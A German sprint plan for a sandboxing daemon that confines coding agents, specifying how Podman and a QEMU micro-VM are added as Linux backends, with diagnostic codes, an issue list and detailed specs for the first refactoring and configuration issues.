# Sprint 7 · Podman als zweites Sandbox-Backend unter Linux

Ziel des Sprints: Unter Linux wählt der Nutzer neben bwrap ein zweites Backend, Podman, je Konfiguration, Konfigurationsprofil, Sitzung (`--backend`) und Oberfläche. Zuerst die gemeinsame Stufe (rootless Podman mit der OCI-Laufzeit `crun`, geteilter Kernel), danach die Kernel-Stufe (eigener Gastkernel; seit HUM-442 als QEMU-micro-VM aus Debian-Paketen, Backend `qemu`, [ADR-0021](../docs/adr/0021-qemu-microvm-kernel-level.md), statt der Laufzeit `krun`). Vorgabe bleibt bwrap. Entscheidungen des Inhabers vom 2026-11-11; Entwurf der Entscheidung in [ADR-0020](../docs/adr/0020-podman-sandbox-backend.md), Analyse, offene Messungen (P0 bis P16, K1 bis K8; für die Kernel-Stufe ersetzt durch Q1 bis Q11 von HUM-442) und Aufwand im Abschnitt „Result (desk part, 2026-11-11)" von HUM-292 in [`sprint-5.md`](sprint-5.md).

Zwei Grenzen gelten für jedes Issue dieses Sprints und sind Akzeptanzkriterium, auch wo das Issue sie nicht eigens nennt:

1. Keine Einstellung schwächt die drei Garantien (`README.md`, `docs/SECURITY.md`, `tests/escape/`), und ein Projekt senkt die Isolationsstufe nie (CONVENTIONS 4.11). Werte, die eine Garantie schwächen würden, haben keinen Schlüssel.
2. Eine unsichere oder nicht erfüllbare Einstellung wird mit `Diagnostic` abgelehnt, beim Laden und beim Start, nie still angewendet; ein gewähltes Backend fällt nie still auf ein anderes zurück.

Leitlinie: Die Namen `podman`, `crun`, `krun`, `libkrun` und `conmon` stehen nur unter `daemon/crates/sandbox/src/podman/` (HUM-145, neuer Abschnitt `[podman]` in `tools/coupling-baseline.toml`), die Namen `qemu`, `virtiofsd`, `vhost-device-vsock` und `microvm` nur unter `daemon/crates/sandbox/src/qemu/` (Abschnitt `[qemu]`, HUM-464). Kein neuer Port, keine Abstraktion über Podman oder QEMU. Jeder Commit, der eine Aussage aus `docs/SECURITY.md` berührt, ändert `docs/SECURITY.md` und `docs/THREAT-MODEL.md` im selben Commit. Vor HUM-433 sind die Messungen P0 bis P15 auf der Referenzmaschine aufgeschrieben, vor HUM-437 auch P17 (Ergebnis in den Abschnitt von HUM-292), vor HUM-443 die Messungen der Kernel-Stufe (HUM-442, Q1 bis Q11). Tor: Keine Stufe ist wählbar, weder in der Konfiguration noch über die CLI, die Oberfläche oder `auto`, bevor ihre Einhänge-Prüfung gelandet (HUM-437, HUM-446) und die Escape-Suite gegen sie in der CI grün ist (HUM-435, HUM-445). Bis zur Zulassung (HUM-448 für Podman, HUM-449 für `qemu`) lehnt jeder Start sie mit `SANDBOX_048` ab; nur die Escape-Suite und die Tests starten eine nicht zugelassene Stufe, über ein Argument im Code, nie über einen Schlüssel.

Diagnose-Codes, hier nur geplant (registriert vom genannten Issue in `codes.rs` und `docs/DIAGNOSTICS.md`, Bereich `SANDBOX` wächst in HUM-431 von 001-033 auf 001-059):

| Code | Bedeutung | Issue |
|---|---|---|
| `SANDBOX_034` | Gewähltes Backend nicht verfügbar; nennt die fehlende Voraussetzung und den Weg zurück (`--backend bwrap`) | HUM-431 |
| `SANDBOX_035` | Backend liegt unter der Isolationsuntergrenze `sandbox.min_isolation` | HUM-431 |
| `SANDBOX_036` | Das Sandbox-Profil verlangt ein anderes Backend als gewählt | HUM-431 |
| `SANDBOX_037` | Podman zu alt oder ohne nötige Fähigkeit (Laufzeit nicht `crun`) | HUM-433 |
| `SANDBOX_038` | Podman nicht rootless, entfernt (`CONTAINER_HOST`, `--remote`) oder eine Podman-Maschine | HUM-433 |
| `SANDBOX_039` | Keine untergeordneten IDs für `--userns keep-id` (`/etc/subuid`, `/etc/subgid`, `newuidmap`) | HUM-433 |
| `SANDBOX_040` | cgroup-Controller `memory`, `pids`, `cpu` nicht delegiert; Grenzen nicht durchsetzbar | HUM-433 |
| `SANDBOX_041` | Container oder VM-Unit einer früheren Sitzung gefunden und entfernt, oder nicht entfernbar (Warnung) | HUM-433, HUM-444 |
| `SANDBOX_042` | Ein eingehängter Ordner ist nicht der geprüfte (Gerät und Inode) | HUM-437 |
| `SANDBOX_043` | Abbild fehlt lokal oder trägt nicht den erwarteten Digest | HUM-439 |
| `SANDBOX_044` | SELinux erzwingt Etiketten; ein Einhängen verlangte Umetikettieren des Projekts | HUM-433 |
| `SANDBOX_045` | Voraussetzung der Kernel-Stufe fehlt: `/dev/kvm`, ein Programm (`qemu-system-x86`, `virtiofsd`, `vhost-device-vsock`), Kernel-Abbild nicht lesbar, Modulverzeichnis, bwrap ohne `--bind-fd` | HUM-464 |
| `SANDBOX_046` | Tür der Kernel-Stufe nicht aufgebaut: vsock-Gerät oder Lauscher der Sitzung fehlt | HUM-464 |
| `SANDBOX_047` | Host-Prüfung des VMM gescheitert (mehr als `lo`, unerklärter Deskriptor oder Socket) | HUM-464 |
| `SANDBOX_048` | Stufe noch nicht zugelassen; wird von HUM-448 (Podman) und HUM-449 (`qemu`) freigegeben | HUM-431 |
| `SANDBOX_049` | Die Mounttabelle in der Sandbox weicht vom Plan ab (zusätzlicher oder fehlender Einhängepunkt) | HUM-437 |
| `DOCTOR_014` | Probestart des Podman-Backends gescheitert | HUM-436 |
| `DOCTOR_015` | Probestart der Kernel-Stufe gescheitert | HUM-444 |

| ID | Titel | Größe | Abhängigkeiten |
|---|---|---|---|
| HUM-428 | Port neutral: `PlanRequest`, `LaunchOptions`, `IsolationLevel`, Enum `Backend` statt `PlatformBackend` | L | HUM-292 |
| HUM-429 | Vorschau und Mounttabelle kommen aus dem Plan, nicht aus bwrap-Flags | M | HUM-428 |
| HUM-430 | Shim: Lebensleine und Umgebung über einen geerbten Deskriptor | M | HUM-428 |
| HUM-431 | Konfiguration: `sandbox.backend`, `sandbox.min_isolation`, Gruppe `sandbox.podman` | M | HUM-428 |
| HUM-432 | RPC und CLI: Backends auflisten, `--backend`, Isolationsstufe im Status | M | HUM-431 |
| HUM-433 | Podman-Adapter, gemeinsame Stufe: erkennen, planen, starten, beenden, prüfen | L | HUM-429, HUM-430, HUM-432 |
| HUM-434 | Podman unter der gehärteten Nutzer-Unit | S | HUM-433 |
| HUM-435 | Escape-Suite je Backend und CI-Job `escape-tests-podman` | M | HUM-433 |
| HUM-436 | `doctor` je Backend mit Probestart | M | HUM-433 |
| HUM-437 | Mounttabelle gleich Plan, geprüfte Ordner nach dem Einhängen belegt, Masken nur auf vorhandenen Pfaden | M | HUM-433, HUM-435 |
| HUM-438 | Podman: Wegwerf-Sandbox mit eigener oberer Schicht | M | HUM-437 |
| HUM-439 | Podman: Abbild als Wurzeldateisystem, mit Digest, ohne Pull beim Start | M | HUM-433 |
| HUM-448 | Podman zulassen: die gemeinsame Stufe wird wählbar | S | HUM-434, HUM-435, HUM-436, HUM-437, HUM-438 |
| HUM-440 | Oberfläche: Backend-Wahl mit Isolationsstufe in Einstellungen und Start | M | HUM-432, HUM-437, HUM-448 |
| HUM-441 | Doku: Podman in README, CONFIG, cli; Nachträge ADR-0002, ADR-0010, ADR-0015; ADR-0020 angenommen | S | HUM-448, HUM-439, HUM-440 |
| HUM-442 | Spike Kernel-Stufe: Weiterleitung, vsock-Tür, Kanäle des VMM, Startzeit, KVM in der CI | M | HUM-433 |
| HUM-464 | Konfiguration und Port: Backend `qemu`, Gruppe `sandbox.qemu`, `krun` entfernt | M | HUM-442 |
| HUM-465 | Shim im Gast: Module laden und sperren, Tür über vsock | M | HUM-442, HUM-437 |
| HUM-443 | Shim: Steuerkanal als Strom, Terminal und weitere Shells im Gast | L | HUM-465 |
| HUM-444 | QEMU-Adapter: Plan, Start in Gefängnissen, Ende, Host-Prüfung, doctor | L | HUM-443, HUM-464, HUM-434 |
| HUM-445 | Escape-Suite der Kernel-Stufe: Proben mit Gast-Root, CI-Job mit KVM | M | HUM-444, HUM-435, HUM-437 |
| HUM-446 | Kernel-Stufe: Projektordner und Wegwerf-Schicht über virtiofs | L | HUM-445, HUM-438 |
| HUM-449 | Kernel-Stufe zulassen: `qemu` wird wählbar | S | HUM-445, HUM-446, HUM-466, HUM-469, HUM-470, HUM-471, HUM-476 |
| HUM-447 | Doku der Kernel-Stufe, Oberfläche schaltet `qemu` frei | S | HUM-449 |
| HUM-451 | Integrationstest: ein Daemon, der die Shell-Tür nicht mehr liest, hält weder Lebensleine noch Agent auf | S | HUM-430 |
| HUM-452 | Podman: ein Container, dessen Client ungeplant endet, wird sofort entfernt, nicht erst beim nächsten Stopp | S | HUM-433 |
| HUM-453 | Podman: `/sys` des Rechners ist im Container verdeckt wie unter bwrap | S | HUM-433 |
| HUM-454 | Podman: die `mounts.conf` des Nutzers erreicht keinen Container | S | HUM-433 |
| HUM-450 | `humanitl sandbox argv` hält zurückgehaltene Werte auch in der CLI zurück | S | HUM-429 |
| HUM-455 | CI: Escape-Suite unter Podman auch mit einem Abbild als Wurzel | M | HUM-439 |
| HUM-456 | Podman: Zugangsdaten zum Ziehen aus einer eigenen Datei des Adapters | S | HUM-439 |
| HUM-457 | Ein laufendes Ziehen eines Abbilds lässt sich abbrechen | S | HUM-439 |
| HUM-458 | PID-1-Integrationstests: ohne nutzbare Sandbox in der CI rot statt übersprungen | S | HUM-451 |
| HUM-459 | Konstanten, die Tests vom Shim abschreiben, bleiben mit ihm im Gleichschritt | S | HUM-451 |
| HUM-460 | Konfiguration: die Beschreibung von `sandbox.podman` nennt die Zulassung von Podman | S | HUM-448 |
| HUM-461 | RPM und AUR empfehlen Podman wie das .deb | S | HUM-441 |
| HUM-462 | Website: Podman als wählbares Backend auf der Sicherheitsseite | S | HUM-441 |
| HUM-463 | Deutsche Übersetzung von ADR-0020 und der deutsche ADR-Index | S | HUM-441 |
| HUM-466 | Kernel-Stufe: beschreibbares `/tmp`, `$HOME` und `/run` im Gast | S | HUM-444 |
| HUM-467 | Kernel-Stufe: Obergrenze der Verbindungen über die Tür je Sitzung | S | HUM-444 |
| HUM-468 | Kernel-Stufe: Host-Prüfung kennt die Programme der Unit | S | HUM-444 |
| HUM-469 | Kernel-Stufe: Grenze der Deskriptoren der virtiofsd-Prozesse | S | HUM-444 |
| HUM-470 | Kernel-Stufe: zwei Flakes auf der CI (kvm-Test ohne CHECK, unplanned_mount mit Exit 3) | S | HUM-445 |
| HUM-471 | Kernel-Stufe: Gast ohne Verbindung des Hosts (kvm-Test ohne CHECK), Konsole im Adapterpfad | M | HUM-470 |
| HUM-472 | Website: das Modell als Angreifer (Lazarus, Microsoft Research), mit Quellen | S | — |
| HUM-475 | Website: die deutschen Texte der Start- und der Sicherheitsseite sprachlich überarbeiten | S | HUM-472 |
| HUM-476 | Kernel-Stufe: Dateicache im Gast wieder an, aber begrenzt | M | HUM-469 |
| HUM-477 | Ereignisse der Sandbox (Isolationsprüfung, Vermerk der Tür) erreichen das Audit-Log | M | HUM-467 |
| HUM-478 | Kernel-Stufe: die Tür pausiert nach einem Fehler von `accept` | S | HUM-467 |
| HUM-479 | Kernel-Stufe: gemeinsame Obergrenze der Tür-Verbindungen mit fairer Teilung | S | HUM-467 |
| HUM-480 | Kernel-Stufe: Programme der Unit erzwingen (`ExecPaths=`) und je Rolle zählen | M | HUM-468 |
| HUM-481 | Kernel-Stufe: Masken auch im Gast über dem Overlay, `--xattrmap` für den Dienst der Schicht | M | HUM-446 |
| HUM-482 | Wegwerf-Schicht: Masken bei Casefold, die obere Schicht mit Gerät und Inode festhalten | S | HUM-446 |
| HUM-483 | Kernel-Stufe: auch gehaltene Inodes begrenzen, Test für die `/proc`-Deskriptoren von PID 1 | S | HUM-476 |
| HUM-484 | Kernel-Stufe: `--allow-mmap` und die Untergrenze 6.6 des Gastkernels unter `--cache auto` prüfen | S | HUM-476 |
| HUM-485 | Kernel-Stufe: Speicher- und Prozessgrenzen der Unit (`MemoryMax=`, `TasksMax=`) | S | HUM-444 |
| HUM-486 | vhost-device-vsock: Fehler beim Start melden, ein stummes Gerät erkennen | S | HUM-471 |
| HUM-487 | KVM-Test der Deskriptorgrenze: Schwelle der Abweisungen hängt nicht an der Länge von `/usr` | S | HUM-469 |
| HUM-488 | doctor: eine Zeile je Voraussetzung auch für eine zugelassene Stufe, der etwas fehlt | S | HUM-449 |
| HUM-489 | CLI: `humanitl run --sandbox-min-isolation` hebt die Untergrenze der Sitzung, statt still wegzufallen | S | HUM-449 |
| HUM-490 | e2e-m4: „the history holds the request as edited" wackelt (30 s) | S | — |
| HUM-491 | macOS: Masken des Klons falten nach Unicode wie APFS | S | HUM-482 |
| HUM-492 | Kernel-Stufe: `humanitl-vm-<instanz>` unter `$XDG_RUNTIME_DIR` bleibt nach dem Daemon liegen | S | HUM-444 |
| HUM-493 | Der Pfad für nicht zugelassene Stufen (`SANDBOX_048`, `detect_unadmitted`) ohne Stufe dahinter | S | HUM-449 |
| HUM-494 | App: die Einstellungszeile der Backends wird mit vier Stufen zu schmal | S | HUM-447 |
| HUM-495 | doctor: `virtio_fs` „nicht geprüft", wenn das Kernel-Abbild fehlt | S | HUM-488 |
| HUM-496 | CLI: eine Wegwerf-Sitzung mit einem Befehl, wie ein Agent nativ, mit Ladeanimation | M | HUM-449 |
| HUM-497 | Stromkanal: Eingabe an ein Terminal bekommt Gegendruck statt still zu verfallen | M | HUM-443 |
| HUM-498 | Stromkanal: eine Shell, deren Öffnen scheiterte, wird im Gast geschlossen | S | HUM-443 |
| HUM-499 | Stromkanal: Größenänderung und Schließen blockieren keinen Worker des Daemons | S | HUM-443 |
| HUM-500 | Image-Pull nimmt das Backend der Sitzung | S | HUM-440 |
| HUM-501 | Konfiguration: Obergrenzen aus der Hardware nur für das gewählte Backend | S | HUM-431 |
| HUM-502 | doctor und Backend-Liste: schnell genug für die Frist der App | S | HUM-436 |
| HUM-503 | Konfiguration: der Fix für `sandbox.podman.rootfs` ohne Anführungszeichen | S | HUM-439 |
| HUM-504 | App: der Abschnitt der Backends verschwindet nicht beim Wechsel | S | HUM-440 |
| HUM-505 | CLI: der Fix von `sandbox image pull` nennt die Referenz | S | HUM-439 |
| HUM-506 | doctor: der gespeicherte Probestart der Kernel-Stufe veraltet mit ihren Programmen und dem Gastkernel | S | HUM-444 |
| HUM-507 | Konfiguration: Fixes von `ChangeSetting`, die `config set` nicht annimmt | S | HUM-503 |
| HUM-508 | doctor: `doctor-probe.json` ohne den Klartextpfad des Programms | S | HUM-506 |
| HUM-509 | Proxy-Test `the_byte_budget_counts_bodies_while_they_are_buffered` wackelt (Connection reset) | S | — |
| HUM-510 | App: eine Auffrischung desselben Backend-Mitglieds zeigt die Liste als ausstehend | S | HUM-504 |
| HUM-511 | Egress: der Adapter `HttpProxy` zu einem Entscheidungs-Proxy des Nutzers | M | ADR-0022 |
| HUM-512 | `hold.ask_mode = "upstream"`: Anfragen ohne Regel entscheidet der Proxy dahinter | M | HUM-511 |
| HUM-513 | Entscheidungs-Proxy: Anleitung für mitmproxy, Ende-zu-Ende-Test | S | HUM-512 |
| HUM-524 | Entscheidungs-Proxy: Burp Suite in der Anleitung, mit Probelauf des Eigentümers | S | HUM-513 |
| HUM-525 | Abhängigkeiten: `chrono` als nicht gepflegt gemeldet, Ausnahme mit Frist | S | – |
| HUM-526 | Abhängigkeiten: von `chrono` auf `jiff` | M | HUM-525 |
| HUM-527 | Website: `astro` auf 7.4.7 oder neuer (zwei Dependabot-Meldungen) | S | – |
| HUM-551 | Website: `picomatch` ≤ 4.0.7 (ReDoS, Dependabot #3), noch ohne Fix | S | HUM-527 |
| HUM-528 | Ein Installationsskript für alle Systeme unter `humanitl.de/install` | M | – |
| HUM-550 | Ein Deinstallationsskript für alle Systeme unter `humanitl.de/uninstall` | M | HUM-528 |
| HUM-529 | Kernel-Stufe startet unter der gehärteten Unit nicht (Module unsichtbar) | S | – |
| HUM-516 | Cloud-Agenten: gemeinsamer Hinweis auf den Abfluss über die Inferenz | S | HUM-037 |
| HUM-518 | Agent-Depot: Kern, `agents.source`, Sperre durch Firmenvorgabe, RPC und CLI `status`, `source`, `remove` | M | ADR-0023 |
| HUM-519 | Agent-Depot: Installation und Update in einer Wartungs-Sandbox, Version angeheftet | M | HUM-518 |
| HUM-563 | Agent-Depot: Wartungssitzung im Daemon, RPC und CLI `agents install`/`update` | M | HUM-519 |
| HUM-520 | Agent-Depot: Anmeldung in der Sandbox und Wächter für das Zurückschreiben der Zugangsdatei | M | HUM-519 |
| HUM-521 | App: Abschnitt „Agenten" für Quelle und Depot | M | HUM-520 |
| HUM-514 | Agent-Adapter Claude Code | M | HUM-516, HUM-518, HUM-519, HUM-520 |
| HUM-515 | Agent-Adapter Codex | M | HUM-516, HUM-518, HUM-519, HUM-520 |
| HUM-517 | Agent-Adapter Antigravity CLI (`agy`, Gemini) | M | HUM-516, HUM-518, HUM-519, HUM-520 |
| HUM-522 | Agent-Depot: Ende-zu-Ende-Lauf mit Claude Code und Anleitung | S | HUM-514, HUM-521 |
| HUM-523 | Agent-Depot: Zugangsdateien verschlüsselt mit Schlüssel aus dem Schlüsselbund | S | HUM-520 |
| HUM-553 | Gemeinsamer Probedurchgang mit dem Eigentümer: gesammelte Handprüfungen | S | HUM-524 |
| HUM-555 | Entscheidungs-Proxy: ein „Drop" des Proxys dahinter erscheint im Audit als `200`, die `502`-Meldung nennt Humanitl | S | HUM-524 |
| HUM-556 | Speicher des Daemons: Flow-Registry ohne Obergrenze, Audit-Kanal unbegrenzt | M | HUM-479 |
| HUM-557 | Kernel-Stufe: die letzten Wege zu eigenem Code in der Unit (memfd, Mounts von bubblewrap, sh und bwrap zusammen) | M | HUM-480 |
| HUM-558 | Test `fd_handover::nobody_coming_ends_the_wait_and_the_socket` wackelt unter paralleler Last | S | — |
| HUM-559 | Plan-Vorschau kennt die Untergrenze der Kommandozeile nicht | S | HUM-489 |
| HUM-560 | App: im Reiter Isolation verliert eine Wahl des Backends per Tastatur den Fokus | S | HUM-510 |
| HUM-561 | Regeln: ein einziger fehlerhafter Eintrag in `rules.yaml` verwirft beim Start alle Regeln des Nutzers | M | HUM-526 |
| HUM-562 | `config set` nimmt Werte an, die erst der Start des Daemons ablehnt | S | HUM-507 |
| HUM-564 | Audit: ein Rückstand des Audit-Zweigs (`Lagged`) erscheint nicht im Audit-Log | S | HUM-556 |
| HUM-565 | Audit: ein gescheiterter Flow hat keinen Eintrag im HMAC-Audit-Log | S | HUM-555 |

## HUM-428 · Port neutral: `PlanRequest`, `LaunchOptions`, `IsolationLevel`, Enum `Backend` statt `PlatformBackend`

### Kontext
Daemon und CLI halten `PlatformBackend`, einen Typ-Alias, der je Build genau ein Backend kennt (`daemon/crates/sandbox/src/lib.rs:160-177`), und erreichen über die Builder-Methoden von `BwrapBackend` am Port vorbei (`with_stdio`, `with_overlay`, `with_expected_work_inode`, `with_approved_work_dir`, `with_output_sink`, `with_read_only_bind`, `with_report_timeout`, `disposable_support`; Aufrufe in `daemon/crates/ipc/src/sandbox.rs:2451-2452, 2615-2650, 3454-3457` und `daemon/bin/humanitl/src/cmd/sandbox.rs:186, 860, 1136-1139`). Seatbelt kam über `cfg`-Zweige hinein. Ein Backend, das der Nutzer je Sitzung wählt, braucht eine Wahl zur Laufzeit.

### Spezifikation
1. `launcher.rs` bekommt `IsolationLevel` (`Policy < Namespaces < Kernel`, `as_str` in `snake_case`), `LaunchOptions` (Felder wie im Entwurf des HUM-292-Ergebnisses, Abschnitt 2) und `PlanRequest<'a>`.
2. `SandboxBackend` wird zu `name`, `isolation`, `disposable_support(&PlanRequest)`, `plan(&PlanRequest)`, `launch`, `isolation_check`. `preview` kommt in HUM-429.
3. Neues Enum `Backend { Bwrap, #[cfg(macos)] Seatbelt }` mit `impl SandboxBackend` durch Weiterreichen, `Backend::detect(name, paths)` und `Backend::fallback(name, paths)`; `PlatformBackend` und die Builder-Methoden entfallen, ihre Werte stehen in `LaunchOptions`. `PLATFORM_BACKEND_NAME` bleibt nur als Name des Systems für `auto`.
4. `LaunchPlan::env_on_program: bool` wird `EnvDelivery { Argv, Program }` (die dritte Variante kommt in HUM-430); `LaunchOnce::status` wird `Option<PipeReader>`; neues privates `Teardown { Process }` am Plan und am Handle, `SandboxHandle::kill` und `terminate` gehen darüber.
5. Daemon (`Running.backend`, `Prepared.backend`), CLI, `escape-launch` und die Tests nutzen `Backend` und `LaunchOptions`. Verhalten unverändert.
6. `tools/coupling-baseline.toml` mit `python3 tools/check_coupling.py --update` nachgezogen; keine Zahl steigt.

### Tests
- Unit: `IsolationLevel` ist geordnet, `as_str` stabil; `Backend::detect("bwrap", ..)` auf einem System ohne `bwrap` liefert `SANDBOX_001`.
- Unit: `LaunchOptions::default()` erzeugt mit `BwrapBackend` dieselbe Kommandozeile wie vorher `BwrapBackend::unchecked(..)` ohne Builder (Vergleich mit einer festgehaltenen Zeile aus dem Stand vor dem Umbau).
- Bestehende Suiten der Crates `humanitl-sandbox`, `humanitl-ipc` und `humanitl` grün, unverändert in ihren Erwartungen.
- Mutationsbeweis: `LaunchOptions::approved_work_dir` im bwrap-Plan ignoriert färbt den vorhandenen Test zu HUM-294 rot.

### Akzeptanzkriterien
1. Kein Aufrufer außerhalb von `daemon/crates/sandbox` nennt `BwrapBackend` oder `SeatbeltBackend`, außer Tests, die ein konkretes Backend prüfen.
2. Die Kommandozeile jeder bestehenden Sitzungsart (direkt, Wegwerf, PTY, Capture) ist Byte für Byte die alte.
3. Kopplungszahlen fallen oder bleiben, `make deps-lint` grün.
4. Der CI-Job `macos` ist der Beleg für die `cfg`-Zweige (Seatbelt-Variante von `Backend`, `LaunchOptions` mit Klon): Er läuft auf dem Issue-Branch voll, auch wenn die Pfadregeln von HUM-424 ihn sonst überspringen würden, und ist grün. Ohne diesen Lauf landet der Commit nicht.

### Fallstricke
- `Running.backend` hält dieselbe Instanz, die gestartet hat, wegen der Frist des Berichts (`ipc/src/sandbox.rs:316-325`); mit `LaunchOptions` gehört `report_timeout` in die Optionen des Starts und muss am `Running` mitgehalten werden, sonst prüft `isolation_check` mit der Vorgabe.
- `#[cfg(target_os = "macos")]`-Zweige in `ipc/src/sandbox.rs` (2488-2496, 2636, 4039-4084) bleiben bis HUM-429; nicht in diesem Commit zusammenziehen.
- Keine `dyn SandboxBackend`-Box: die Optionen tragen `OutputSink`, und das Enum hält `Clone`.

## HUM-429 · Vorschau und Mounttabelle kommen aus dem Plan, nicht aus bwrap-Flags

### Kontext
`Status.mounts` entsteht unter Linux, indem `mounts_of` die bwrap-Zeile Flag für Flag liest (`daemon/crates/ipc/src/sandbox.rs:4192`), die Vorschau ruft `to_bwrap_args` direkt (`4017-4036`), unter macOS gibt es eine eigene Vorschau (`SeatbeltPreview`, `PolicyRow`, `4039-4084`, `4130`). Ein drittes Backend bräuchte einen dritten Parser.

### Spezifikation
1. `SandboxBackend::preview(&PlanRequest) -> PlanPreview` ohne Seiteneffekte: `argv`, `policy: Vec<PolicyRow>`, `env`, `policy_text`, `door: Door`, `limits: ResourceLimits` (bei bwrap leer).
2. `PolicyRow` wandert aus `seatbelt/` nach `launcher.rs` und trägt Modus, Quelle, Ziel, Herkunft (Profil, Sitzung, Nutzer) und den Namen aus der Profildatei; bwrap erzeugt die Zeilen beim Übersetzen des Profils aus denselben Daten wie die Argumente, nicht aus den Argumenten.
3. `mounts_of` entfällt; `Prepared::shown` nutzt `preview` für jedes Backend. Die `cfg`-Zweige von `argv`, `shown`, `mount_of_rule` fallen weg.
4. `Door` hat die Varianten `SocketFile`, `LoopbackPort`, `VsockPort`; `Status` bekommt das Feld `door` als Text (`PROTO_MINOR` steigt).

### Tests
- Unit je Backend: Jede Zeile von `policy` hat ein Gegenstück in `argv` (bwrap: Ziel steht hinter einem Bind-Flag), und jedes Bind-Flag in `argv` hat eine Zeile. Das ersetzt den Parser durch einen Vergleich in beide Richtungen.
- Snapshot-Test: Die Mounttabelle des Profils `default` ist vor und nach dem Umbau gleich (festgehaltene Erwartung aus dem Stand vor dem Umbau).
- Mutationsbeweis: eine Maske in `to_bwrap_args` ohne `PolicyRow` färbt den Vergleichstest rot.

### Akzeptanzkriterien
1. Oberfläche und `humanitl sandbox argv` zeigen unter Linux und macOS dasselbe wie vorher; die Tabelle verliert keinen Mount.
2. Kein Code außerhalb der Adapter liest Backend-Flags.
3. Kopplung von `ipc/src/sandbox.rs` sinkt, Grundlinie nachgezogen.

### Fallstricke
- Die Zurückhaltung von Umgebungswerten (`redact_hidden_values`, `WITHHELD_PLACEHOLDER`) gilt weiter für `argv` jedes Backends, das Werte in der Zeile trägt; die Entscheidung bleibt die eine Stelle `Prepared::shows`.
- `Mount.profile_path` und `MOUNT_MODE_DENIED` aus HUM-376 bleiben im Protokoll.

## HUM-430 · Shim: Lebensleine und Umgebung über einen geerbten Deskriptor

### Kontext
Podman startet den Container unter `conmon`, nicht als Kind des aufrufenden Prozesses; ein `SIGKILL` an `podman run` lässt den Container weiterlaufen (Messung P7). `--die-with-parent` hat dort kein Gegenstück. Außerdem schreibt Podman jeden `-e`-Wert in die gespeicherte Konfiguration des Containers auf die Platte (Messung P11). Beides löst der Shim, für jedes Backend gleich.

### Spezifikation
1. Neue Option des Shims `--lifeline-fd <n>`: Der Shim (PID 1) wartet neben seinem Kind auf `POLLHUP` oder `EOF` am Deskriptor und beendet dann die Sandbox wie bei `SIGTERM` (Gnadenfrist `KILL_GRACE`, dann `SIGKILL` an alle). Der Daemon hält das Schreibende mit `CLOEXEC`, nur er.
2. Neue Option `--env-fd <n>`: ein versiegelter memfd mit der Umgebung als JSON-Objekt (`String` zu `String`); der Shim liest ihn vor allem anderen, setzt die Umgebung des Agenten daraus und schließt ihn. `RESERVED_ENV` und die Prüfung gegen `LD_*` gelten wie für `--setenv`.
3. `EnvDelivery::InheritedFd(RawFd)` im Plan. bwrap bleibt bei `Argv`; die neue Variante nutzt zuerst Podman. Die Vorschau zeigt die Umgebung weiter in der Tabelle.
4. Beide Deskriptoren gehen nie an den Agenten: der Shim schließt sie vor dem `exec`, wie den Berichts-Deskriptor.

### Tests
- Shim-Unit: `--env-fd` mit kaputtem JSON endet mit `EXIT_SETUP` und einer `CHECK`-Zeile; ein Schlüssel aus `RESERVED_ENV` wird abgelehnt.
- Integration unter bwrap (der Shim ist derselbe): Sandbox mit `--lifeline-fd`, Schreibende im Test geschlossen, die Sandbox endet innerhalb von `KILL_GRACE` plus einer Sekunde.
- Integration: Der Agent sieht weder Lebensleine noch Umgebungs-memfd unter `/proc/self/fd`.
- Mutationsbeweis: `POLLHUP` ignoriert färbt den Lebensleinen-Test rot; das Schließen vor `exec` entfernt färbt den fd-Test rot.

### Akzeptanzkriterien
1. Eine Sandbox mit Lebensleine endet, wenn der Prozess endet, der das Schreibende hält, auch nach `SIGKILL`.
2. Kein Umgebungswert steht in `argv` eines Backends, das `InheritedFd` nutzt.
3. `docs/SECURITY.md` Abschnitt 4 nennt die zwei neuen Deskriptoren und dass der Agent sie nicht erbt; `docs/THREAT-MODEL.md` K-06 nennt die Lebensleine als Ersatz für `--die-with-parent` und K-15 bleibt unverändert, was der Commit-Body begründet.

### Fallstricke
- Das Leseende der Lebensleine ist in jedem Prozess offen, der es erbt (auch im `podman run`-Client); entscheidend ist allein, dass das Schreibende nur im Daemon liegt.
- Der Shim läuft ohne tokio; `poll` auf Lebensleine, Steuerkanal und `SIGCHLD`-Pipe in derselben Schleife, keine zweite.

## HUM-431 · Konfiguration: `sandbox.backend`, `sandbox.min_isolation`, Gruppe `sandbox.podman`

### Kontext
Heute gibt es `sandbox.backend` nur im Sandbox-Profil (`profiles/sandbox/*.toml`, `daemon/crates/sandbox/src/profile.rs:266-290`, geprüft in `1663-1676`), nicht in `config.toml`. Der Inhaber will die Wahl in Konfiguration, Konfigurationsprofil, CLI und Oberfläche, und ein Projekt darf die Stufe nie senken.

### Spezifikation
1. Schema (`daemon/crates/config/src/schema.rs`): `sandbox.backend` (`auto | bwrap | podman | seatbelt`, Vorgabe `auto`, Stufe `basic`, `x-project-scope = "denied"`); `sandbox.min_isolation` (`policy | namespaces | kernel`, Vorgabe `policy`, Stufe `advanced`, `x-project-scope = "allowed"`); Gruppe `sandbox.podman` mit `program`, `runtime` (`crun | krun`), `rootfs` (`host | image`), `image`, `memory_mib`, `cpus`, `pids_limit`, `start_timeout_secs`, alle `denied`, Stufe `advanced` oder `expert`.
2. Für `sandbox.min_isolation` gewinnt über alle Ebenen der strengste Wert, nicht die oberste Ebene; die Herkunftsanzeige nennt die Ebene des strengsten.
3. Auflösung zur Startzeit: Backend aus der Konfiguration (inklusive `cli_overrides` mit `sandbox.backend` auf der Erlaubnisliste des Start-RPC), `auto` wird `bwrap` unter Linux und `seatbelt` unter macOS. Nennt das Sandbox-Profil ein Backend außer `auto`, und ist es ein anderes: `SANDBOX_036`. Liegt die Stufe unter der Untergrenze: `SANDBOX_035`. Ist das Backend nicht verfügbar: `SANDBOX_034`, ohne Rückfall.
4. Wertebereiche: `memory_mib` mindestens 256 und höchstens der Arbeitsspeicher des Hosts, `cpus` größer 0 und höchstens die Zahl der CPUs, `pids_limit` mindestens 64; sonst `CONFIG_003`. `image` ist bei `rootfs = "image"` Pflicht und muss `@sha256:` tragen.
5. `profile.rs` `check_header` kennt `podman`; `seatbelt` weiter nur unter macOS.
